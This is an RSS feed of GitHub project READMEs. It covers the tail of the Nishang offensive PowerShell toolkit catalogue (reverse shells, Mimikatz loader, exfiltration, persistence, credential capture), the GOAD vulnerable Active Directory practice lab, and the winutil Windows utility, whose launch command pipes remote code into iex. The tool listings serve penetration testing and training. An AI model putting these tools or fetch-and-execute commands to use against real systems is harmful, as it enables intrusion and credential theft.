&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Show-TargetScreen.ps1&quot;&gt;Show-TargetScreen&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Connect back and Stream target screen using MJPEG.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1&quot;&gt;Invoke-Mimikatz&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Load mimikatz in memory. Updated and with some customisation.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikittenz.ps1&quot;&gt;Invoke-Mimikittenz&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Extract juicy information from target process (like browsers) memory using regex.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-SSIDExfil.ps1&quot;&gt;Invoke-SSIDExfil&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Exfiltrate information like user credentials, using WLAN SSID.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-SessionGopher.ps1&quot;&gt;Invoke-SessionGopher&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Identify admin jump-boxes and/or computers used to access Unix machines.&lt;/p&gt; 
&lt;h4&gt;MITM&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/MITM/Invoke-Interceptor.ps1&quot;&gt;Invoke-Interceptor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A local HTTPS proxy for MITM attacks.&lt;/p&gt; 
&lt;h4&gt;Pivot&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Create-MultipleSessions.ps1&quot;&gt;Create-MultipleSessions&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Check credentials on multiple computers and create PSSessions.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Run-EXEonRemote.ps1&quot;&gt;Run-EXEonRemote&lt;/a&gt; Copy and execute an executable on multiple machines.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Invoke-NetworkRelay.ps1&quot;&gt;Invoke-NetworkRelay&lt;/a&gt; Create network relays between computers.&lt;/p&gt; 
&lt;h4&gt;Prasadhak&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Prasadhak/Prasadhak.ps1&quot;&gt;Prasadhak&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Check running hashes of running process against the VirusTotal database.&lt;/p&gt; 
&lt;h4&gt;Scan&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Scan/Brute-Force.ps1&quot;&gt;Brute-Force&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Brute force FTP, Active Directory, MSSQL, and Sharepoint.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Scan/Port-Scan.ps1&quot;&gt;Port-Scan&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A handy port scanner.&lt;/p&gt; 
&lt;h4&gt;Powerpreter&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/tree/master/powerpreter&quot;&gt;Powerpreter&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;All the functionality of nishang in a single script module.&lt;/p&gt; 
&lt;h4&gt;Shells&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PsGcat.ps1&quot;&gt;Invoke-PsGcat&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PsGcatAgent.ps1&quot;&gt;Invoke-PsGcatAgent&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute commands and scripts sent by Invoke-PsGcat.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;Invoke-PowerShellTcp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse connect or bind shell&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLine.ps1&quot;&gt;Invoke-PowerShellTcpOneLine&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1&quot;&gt;Invoke-PowerShellTcpOneLineBind&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Bind version of Invoke-PowerShellTcpOneLine.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellUdp.ps1&quot;&gt;Invoke-PowerShellUdp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse connect or bind shell over UDP&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellUdpOneLine.ps1&quot;&gt;Invoke-PowerShellUdpOneLine&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Stripped down version of Invoke-PowerShellUdp.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PoshRatHttps.ps1&quot;&gt;Invoke-PoshRatHttps&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Reverse interactive PowerShell over HTTPS.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PoshRatHttp.ps1&quot;&gt;Invoke-PoshRatHttp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Reverse interactive PowerShell over HTTP.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Remove-PoshRat.ps1&quot;&gt;Remove-PoshRat&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Clean the system after using Invoke-PoshRatHttps&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellWmi.ps1&quot;&gt;Invoke-PowerShellWmi&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Interactive PowerShell using WMI.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;Invoke-PowerShellIcmp&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse shell over ICMP.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-JSRatRundll.ps1&quot;&gt;Invoke-JSRatRundll&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse shell over HTTP using rundll32.exe.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-JSRatRegsvr.ps1&quot;&gt;Invoke-JSRatRegsvr&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;An interactive PowerShell reverse shell over HTTP using regsvr32.exe.&lt;/p&gt; 
&lt;h4&gt;Utility&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Add-Exfiltration.ps1&quot;&gt;Add-Exfiltration&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Add-Persistence.ps1&quot;&gt;Add-Persistence&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Add reboot persistence capability to a script.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Remove-Persistence.ps1&quot;&gt;Remove-Persistence&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Remote persistence added by the Add-Persistence script.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Do-Exfiltration.ps1&quot;&gt;Do-Exfiltration&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Pipe (|) this to any script to exfiltrate the output.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Download.ps1&quot;&gt;Download&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Transfer a file to the target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Parse_Keys.ps1&quot;&gt;Parse_Keys&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Parse keys logged by the keylogger.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Invoke-Decode.ps1&quot;&gt;Invoke-Encode&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Encode and compress a script or string.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Invoke-Decode.ps1&quot;&gt;Invoke-Decode&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Decode and decompress a script or string from Invoke-Encode.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Start-CaptureServer.ps1&quot;&gt;Start-CaptureServer&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Run a web server which logs Basic authentication and SMB hashes.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/ConvertTo-ROT13.ps1&quot;&gt;ConvertTo-ROT13&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Encode a string to ROT13 or decode a ROT13 string.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Out-DnsTxt.ps1&quot;&gt;Out-DnsTxt&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Generate DNS TXT records which could be used with other scripts.&lt;/p&gt; 
&lt;p&gt;[Base64ToString]&lt;/p&gt; 
&lt;p&gt;[StringToBase64]&lt;/p&gt; 
&lt;p&gt;[ExetoText]&lt;/p&gt; 
&lt;p&gt;[TexttoExe]&lt;/p&gt; 
&lt;h3&gt;Updates&lt;/h3&gt; 
&lt;p&gt;Updates about Nishang can be found at my blog &lt;a href=&quot;http://labofapenetrationtester.com&quot;&gt;http://labofapenetrationtester.com&lt;/a&gt; and my Twitter feed @nikhil_mitt.&lt;/p&gt; 
&lt;h3&gt;Bugs, Feedback and Feature Requests&lt;/h3&gt; 
&lt;p&gt;Please raise an issue if you encounter a bug or have a feature request. You can email me at nikhil [dot] uitrgpv at gmail.com&lt;/p&gt; 
&lt;h4&gt;Mailing List&lt;/h4&gt; 
&lt;p&gt;For feedback, discussions, and feature requests, join: &lt;a href=&quot;http://groups.google.com/group/nishang-users&quot;&gt;http://groups.google.com/group/nishang-users&lt;/a&gt;&lt;/p&gt; 
&lt;h4&gt;Contributing&lt;/h4&gt; 
&lt;p&gt;I am always looking for contributors to Nishang. Please submit requests or drop me an email.&lt;/p&gt; 
&lt;h4&gt;Blog Posts&lt;/h4&gt; 
&lt;p&gt;Some helpful blog posts to check out for beginners:&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html&quot;&gt;http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html&quot;&gt;http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html&quot;&gt;http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html&quot;&gt;http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;All posts about Nishang:&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/search/label/Nishang&quot;&gt;http://www.labofapenetrationtester.com/search/label/Nishang&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Orange-Cyberdefense/GOAD</title>
      <link>https://github.com/Orange-Cyberdefense/GOAD</link>
      <description>&lt;p&gt;game of active directory&lt;/p&gt;&lt;hr&gt;&lt;div align=&quot;center&quot;&gt; 
 &lt;h1&gt;&lt;img alt=&quot;GOAD (Game Of Active Directory)&quot; src=&quot;https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/main/docs/mkdocs/docs/img/logo_GOAD3.png&quot;&gt;&lt;/h1&gt; 
 &lt;br&gt; 
&lt;/div&gt; 
&lt;p&gt;&lt;strong&gt;GOAD (v3)&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;span&gt;🔖&lt;/span&gt; Documentation : &lt;a href=&quot;https://orange-cyberdefense.github.io/GOAD/&quot;&gt;https://orange-cyberdefense.github.io/GOAD/&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Description&lt;/h2&gt; 
&lt;p&gt;GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!CAUTION] This lab is extremely vulnerable, do not reuse recipe to build your environment and do not deploy this environment on internet without isolation (this is a recommendation, use it as your own risk).&lt;br&gt; This repository was build for pentest practice.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/main/docs/img/goad_screenshot.png&quot; alt=&quot;goad_screenshot&quot;&gt;&lt;/p&gt; 
&lt;h2&gt;Licenses&lt;/h2&gt; 
&lt;p&gt;This lab use free Windows VM only (180 days). After that delay enter a license on each server or rebuild all the lab (may be it&#39;s time for an update ;))&lt;/p&gt; 
&lt;h2&gt;Available labs&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;GOAD Lab family and extensions overview&lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;img alt=&quot;GOAD&quot; width=&quot;800&quot; src=&quot;https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/main/docs/img/diagram-GOADv3-full.png&quot;&gt; 
&lt;/div&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://orange-cyberdefense.github.io/GOAD/labs/GOAD/&quot;&gt;GOAD&lt;/a&gt; : 5 vms, 2 forests, 3 domains (full goad lab)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;img alt=&quot;GOAD&quot; width=&quot;800&quot; src=&quot;https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/main/docs/img/GOAD_schema.png&quot;&gt; 
&lt;/div&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Light/&quot;&gt;GOAD-Light&lt;/a&gt; : 3 vms, 1 forest, 2 domains (smaller goad lab for those with a smaller pc)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;img alt=&quot;GOAD Light&quot; width=&quot;600&quot; src=&quot;https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/main/docs/img/GOAD-Light_schema.png&quot;&gt; 
&lt;/div&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href=&quot;https://orange-cyberdefense.github.io/GOAD/labs/MINILAB/&quot;&gt;MINILAB&lt;/a&gt;: 2 vms, 1 forest, 1 domain (basic lab with one DC (windows server 2019) and one Workstation (windows 10))&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href=&quot;https://orange-cyberdefense.github.io/GOAD/labs/SCCM/&quot;&gt;SCCM&lt;/a&gt; : 4 vms, 1 forest, 1 domain, with microsoft configuration manager installed&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;img alt=&quot;SCCM&quot; width=&quot;600&quot; src=&quot;https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/main/docs/img/SCCMLAB_overview.png&quot;&gt; 
&lt;/div&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://orange-cyberdefense.github.io/GOAD/labs/NHA/&quot;&gt;NHA&lt;/a&gt; : A challenge with 5 vms and 2 domains. no schema provided, you will have to find out how break it.&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>ChrisTitusTech/winutil</title>
      <link>https://github.com/ChrisTitusTech/winutil</link>
      <description>&lt;p&gt;Chris Titus Tech&#39;s Windows Utility - Install Programs, Tweaks, Fixes, and Updates&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Chris Titus Tech&#39;s Windows Utility&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/releases/latest&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/release/ChrisTitusTech/winutil?color=%230567ff&amp;amp;label=Latest%20Release&amp;amp;style=for-the-badge&quot; alt=&quot;Version&quot;&gt;&lt;/a&gt; &lt;img src=&quot;https://img.shields.io/github/downloads/ChrisTitusTech/winutil/winutil.ps1?label=Total%20Downloads&amp;amp;style=for-the-badge&quot; alt=&quot;GitHub Downloads (specific asset, all releases)&quot;&gt; &lt;a href=&quot;https://discord.gg/RUbZUZyByQ&quot;&gt;&lt;img src=&quot;https://dcbadge.limes.pink/api/server/https://discord.gg/RUbZUZyByQ?theme=default-inverted&amp;amp;style=for-the-badge&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;This utility is a compilation of Windows tasks I perform on each Windows system I use. It is meant to streamline &lt;em&gt;installs&lt;/em&gt;, debloat with &lt;em&gt;tweaks&lt;/em&gt;, troubleshoot with &lt;em&gt;config&lt;/em&gt;, and fix Windows &lt;em&gt;updates&lt;/em&gt;. I am extremely picky about any contributions to keep this project clean and efficient.&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/ChrisTitusTech/winutil/main/docs/assets/Title-Screen.png&quot; alt=&quot;screen-install&quot;&gt;&lt;/p&gt; 
&lt;h2&gt;💡 Usage&lt;/h2&gt; 
&lt;p&gt;Winutil must be run in Admin mode because it performs system-wide tweaks. To achieve this, run PowerShell as an administrator. Here are a few ways to do it:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start menu Method:&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Right-click on the start menu.&lt;/li&gt; 
   &lt;li&gt;Choose &quot;Windows PowerShell (Admin)&quot; (for Windows 10) or &quot;Terminal (Admin)&quot; (for Windows 11).&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Search and Launch Method:&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Press the Windows key.&lt;/li&gt; 
   &lt;li&gt;Type &quot;PowerShell&quot; or &quot;Terminal&quot; (for Windows 11).&lt;/li&gt; 
   &lt;li&gt;Press &lt;code&gt;Ctrl + Shift + Enter&lt;/code&gt; or Right-click and choose &quot;Run as administrator&quot; to launch it with administrator privileges.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Launch Command&lt;/h3&gt; 
&lt;h4&gt;Stable Branch (Recommended)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;irm &quot;https://christitus.com/win&quot; | iex
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Dev Branch&lt;/h4&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;irm &quot;https://christitus.com/windev&quot; | iex
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If you have Issues, refer to &lt;a href=&quot;https://christitustech.github.io/winutil/KnownIssues/&quot;&gt;Known Issues&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;🎓 Documentation&lt;/h2&gt; 
&lt;h3&gt;&lt;a href=&quot;https://christitustech.github.io/winutil/&quot;&gt;WinUtil Official Documentation&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=6UQZ5oQg8XA&quot;&gt;YouTube Tutorial&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;&lt;a href=&quot;https://christitus.com/windows-tool/&quot;&gt;ChrisTitus.com Article&lt;/a&gt;&lt;/h3&gt; 
&lt;h2&gt;💖 Support&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;To morally and mentally support the project, make sure to leave a ⭐️!&lt;/li&gt; 
 &lt;li&gt;EXE Wrapper for $10 @ &lt;a href=&quot;https://www.cttstore.com/windows-toolbox&quot;&gt;https://www.cttstore.com/windows-toolbox&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;💖 Sponsors&lt;/h2&gt; 
&lt;p&gt;These are the sponsors that help keep this project alive with monthly contributions.&lt;/p&gt; 
&lt;!-- sponsors --&gt;
&lt;a href=&quot;https://github.com/TriHydera&quot;&gt;&lt;img src=&quot;https://github.com/TriHydera.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: TriHydera&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/jozozovko&quot;&gt;&lt;img src=&quot;https://github.com/jozozovko.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/DelDongo&quot;&gt;&lt;img src=&quot;https://github.com/DelDongo.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/markamos&quot;&gt;&lt;img src=&quot;https://github.com/markamos.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Mark Amos&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/dwelfusius&quot;&gt;&lt;img src=&quot;https://github.com/dwelfusius.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/mews-se&quot;&gt;&lt;img src=&quot;https://github.com/mews-se.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Martin Stockzell&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/jdiegmueller&quot;&gt;&lt;img src=&quot;https://github.com/jdiegmueller.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Jason A. Diegmueller&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/altugtekiner&quot;&gt;&lt;img src=&quot;https://github.com/altugtekiner.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/robertsandrock&quot;&gt;&lt;img src=&quot;https://github.com/robertsandrock.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: RMS&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/KenichiQaz&quot;&gt;&lt;img src=&quot;https://github.com/KenichiQaz.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Stefan&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/paulsheets&quot;&gt;&lt;img src=&quot;https://github.com/paulsheets.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Paul&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/djones369&quot;&gt;&lt;img src=&quot;https://github.com/djones369.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Dave Jones&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/anthonymendez&quot;&gt;&lt;img src=&quot;https://github.com/anthonymendez.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Anthony Mendez&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/claudemods&quot;&gt;&lt;img src=&quot;https://github.com/claudemods.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: claudemods&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/FatBastard0&quot;&gt;&lt;img src=&quot;https://github.com/FatBastard0.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/Ascent7910&quot;&gt;&lt;img src=&quot;https://github.com/Ascent7910.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Max&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/DursleyGuy&quot;&gt;&lt;img src=&quot;https://github.com/DursleyGuy.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: DursleyGuy&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/realmuddy&quot;&gt;&lt;img src=&quot;https://github.com/realmuddy.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Phillip Waters&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/quaszi&quot;&gt;&lt;img src=&quot;https://github.com/quaszi.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/DwayneTheRockLobster1&quot;&gt;&lt;img src=&quot;https://github.com/DwayneTheRockLobster1.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/KieraKujisawa&quot;&gt;&lt;img src=&quot;https://github.com/KieraKujisawa.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Kiera Meredith&quot;&gt;&lt;/a&gt;
&lt;!-- sponsors --&gt; 
&lt;h2&gt;🏅 Thanks to all Contributors&lt;/h2&gt; 
&lt;p&gt;Thanks a lot for spending your time helping Winutil grow. Thanks a lot! Keep rocking 🍻.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/graphs/contributors&quot;&gt;&lt;img src=&quot;https://contrib.rocks/image?repo=ChrisTitusTech/winutil&quot; alt=&quot;Contributors&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;📊 GitHub Stats&lt;/h2&gt; 
&lt;p&gt;&lt;img src=&quot;https://repobeats.axiom.co/api/embed/aad37eec9114c507f109d34ff8d38a59adc9503f.svg?sanitize=true&quot; alt=&quot;Alt&quot; title=&quot;Repobeats analytics image&quot;&gt;&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
